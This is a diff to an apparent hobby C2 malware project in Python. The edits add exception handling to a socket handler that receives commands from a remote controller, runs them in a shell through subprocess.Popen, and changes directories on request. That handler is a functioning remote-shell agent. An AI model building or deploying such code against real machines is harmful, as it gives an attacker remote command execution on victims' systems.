@@ -7,10 +7,9 @@
 #                   experience for building large-scale projects, along with developing an 
 #                   understanding of C2 malware and a further understanding of Python 
 #                   Socket applications.
-# Theme Song:    https://www.youtube.com/watch?v=3abZal0fXCU&ab_channel=MichaelWyckoff
-# Changelog:    Added command-line arguments for IP and PORT
-#               Split sections of handler() into subfunctions
-#               Added fancy new banner
+# Theme Song:   https://www.youtube.com/watch?v=3abZal0fXCU&ab_channel=MichaelWyckoff
+# Changelog:    Moved some exception handling into __main__
+#               Revised exception handling
 ###########################################################################################
 
 import socket
@@ -58,11 +57,15 @@ def handler():
             break
 
         elif message.split(" ")[0] == 'cd':
-            directory = str(message.split(" ")[1])
-            os.chdir(directory)
-            current_dir = os.getcwd()
-            print(f'[+] Changed to {current_dir}')
-            comm_out(current_dir)
+            try:
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                current_dir = os.getcwd()
+                print(f'[+] Changed to {current_dir}')
+                comm_out(current_dir)
+            except FileNotFoundError:
+                comm_out('Invalid directory. Please try again.')
+                continue
 
         else:
             command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -71,7 +74,12 @@ def handler():
 
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host_ip = sys.argv[1]
-    host_port = int(sys.argv[2])
-    banner()
-    handler()
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
+        #banner()
+        handler()
+    except IndexError:
+        print('[-] Command line arguments are missing. Please try again.')
+    except Exception as e:
+        print(e)
